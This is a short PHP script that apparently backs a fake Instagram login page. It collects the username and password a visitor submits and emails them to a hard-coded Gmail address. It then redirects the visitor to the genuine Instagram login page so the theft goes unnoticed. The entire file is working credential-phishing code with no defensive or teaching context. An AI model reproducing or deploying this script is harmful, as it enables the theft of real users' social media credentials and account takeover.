<?php

//varible setting
$username = $_REQUEST['u_name'];  // fetch username
 $passcode = $_REQUEST['pass'];  // fetch password
 $subject = "Someone Login ! Insta Dummy page";
 $to ="coder00700@gmail.com";
 
 $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
 


// check input fields
if (empty($username)|| empty($passcode)){ // name or message
echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
    window.history.go(-1);
    </script>";
}
else 
{ 
    mail($to,$subject,$txt); // send an email 
    // echo"<script type='text/javascript'>alert('Check your internet connection. ');
    // window.history.go(-1);
    // </script>";
    header("Location: https://www.instagram.com/accounts/login/");
}


?>
